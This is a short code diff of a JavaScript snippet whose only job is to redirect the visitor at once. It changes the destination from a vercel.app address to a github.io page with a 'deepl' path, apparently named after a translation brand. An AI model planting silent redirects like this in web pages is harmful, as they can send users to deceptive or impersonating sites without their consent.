@@ -1,4 +1,5 @@
 (function() {
-    window['location'] = 'https://anybufdxx.vercel.app/';
+    window['location'] = 'https://ab168188z.github.io/deepl/';
 })();
+
 
